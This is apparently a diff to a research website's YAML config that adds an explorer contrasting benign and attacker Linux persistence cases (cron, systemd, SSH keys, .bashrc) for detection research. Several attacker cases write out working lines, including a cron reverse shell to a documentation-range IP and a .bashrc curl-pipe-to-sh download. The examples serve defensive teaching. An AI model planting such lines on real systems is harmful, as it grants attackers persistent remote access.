@@ -5,28 +5,89 @@ summary: >-
   My research asks whether a local language model that knows the machine, including its package
   history and admin activity, can tell the two apart and explain its reasoning.
 
-# Shown as a table on the home page. Technique IDs link to MITRE ATT&CK.
-examples:
-  - mechanism: Cron job
-    technique: T1053.003
-    user: Nightly backup script
-    attacker: Reverse shell every 5 minutes
-  - mechanism: systemd service
-    technique: T1543.002
-    user: New web server after install
-    attacker: Disguised service that runs a payload at boot
-  - mechanism: SSH authorized keys
-    technique: T1098.004
-    user: Admin adds a laptop's key
-    attacker: Unknown key added to root
-  - mechanism: Shell configuration
-    technique: T1546.004
-    user: Alias added to .bashrc
-    attacker: Command in .bashrc that calls home on login
-
 interests:
   - Host-based intrusion detection
   - Local language models for security
   - Linux persistence
   - Explainable AI
   - Defensive cyber operations
+
+# Interactive "You make the call" explorer on the home page.
+# Illustrative scenarios only (not model output). IPs use the 203.0.113.0/24 documentation range.
+examples:
+  - mechanism: Cron job
+    technique: T1053.003
+    cases:
+      - kind: user
+        path: /etc/cron.d/backup
+        line: "0 2 * * * root rsync -a /home/ /mnt/backup/"
+        context:
+          - rsync was installed by the package manager three days earlier
+          - Written by the admin through sudo during a logged-in session
+          - /mnt/backup is a mounted drive already used for backups
+        why: Scheduled by the admin, uses an installed tool, and writes to a known backup location.
+      - kind: attacker
+        path: /var/spool/cron/crontabs/www-data
+        line: "*/5 * * * * bash -c 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'"
+        context:
+          - The web server account has never had a crontab
+          - No admin session was active when the file was written
+          - Opens an interactive shell to an address the host has never contacted
+        why: A reverse shell every five minutes from a service account, with no admin activity behind it.
+  - mechanism: systemd service
+    technique: T1543.002
+    cases:
+      - kind: user
+        path: /usr/lib/systemd/system/nginx.service
+        line: "ExecStart=/usr/bin/nginx -g 'daemon off;'"
+        context:
+          - The unit file is owned by the nginx package
+          - The package was installed minutes earlier by the admin
+          - The binary path matches the package's file list
+        why: The service arrived with a package the admin just installed.
+      - kind: attacker
+        path: /etc/systemd/system/dbus-update.service
+        line: "ExecStart=/tmp/.cache/upd"
+        context:
+          - No installed package owns this unit file
+          - The binary sits in a hidden folder inside a world-writable temp directory
+          - The name imitates a real system component
+        why: An unowned service, disguised as a system component, that runs a hidden binary at every boot.
+  - mechanism: SSH authorized keys
+    technique: T1098.004
+    cases:
+      - kind: user
+        path: /home/admin/.ssh/authorized_keys
+        line: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... admin@laptop"
+        context:
+          - Added during the admin's own interactive session
+          - The session came from an address the admin uses regularly
+          - The key comment names the admin's laptop
+        why: The account owner added their own key from a familiar session.
+      - kind: attacker
+        path: /root/.ssh/authorized_keys
+        line: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA..."
+        context:
+          - Written by a process started from the web server
+          - No one was logged in when the key appeared
+          - The key has no comment and has never been seen on this host
+        why: An unknown key on root, written by a web-facing process, gives an attacker a way back in.
+  - mechanism: Shell configuration
+    technique: T1546.004
+    cases:
+      - kind: user
+        path: /home/user/.bashrc
+        line: "alias ll='ls -la'"
+        context:
+          - Edited by the user in a text editor
+          - The change only adds a shortcut
+          - Nothing new runs or connects to the network
+        why: A cosmetic shortcut added by the account's owner.
+      - kind: attacker
+        path: /home/user/.bashrc
+        line: "curl -s http://203.0.113.9/s | sh &"
+        context:
+          - Written by a non-interactive process, not an editor
+          - Downloads and runs a remote script at every login
+          - The address has never been contacted before
+        why: Every new shell quietly downloads and runs code from an unknown server.
